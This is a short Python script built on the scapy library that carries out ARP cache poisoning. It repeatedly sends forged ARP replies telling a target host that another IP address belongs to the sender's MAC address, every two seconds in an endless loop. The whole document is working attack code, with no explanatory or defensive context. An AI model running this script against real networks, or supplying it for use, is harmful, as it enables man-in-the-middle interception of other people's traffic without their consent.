from scapy.all import ARP,Ether,send
import time


def arp_spoof(target_ip,spoof_ip,interface):
    arp_response=ARP(
        op=2,
        pdst=target_ip,
        psrc=spoof_ip,
        hwdst="ff:ff:ff:ff:ff:ff")
    print(f"[+] Sending spoofed ARP reply: {spoof_ip} is-at {arp_response.hwsrc} to {target_ip}")
    send(arp_response, iface=interface, verbose=1)
    while True:
        print(f"[+] Spoofing {target_ip}: telling it {spoof_ip} is at {arp_response.hwsrc}")
        send(arp_response,iface=interface,verbose=0)
        time.sleep(2)


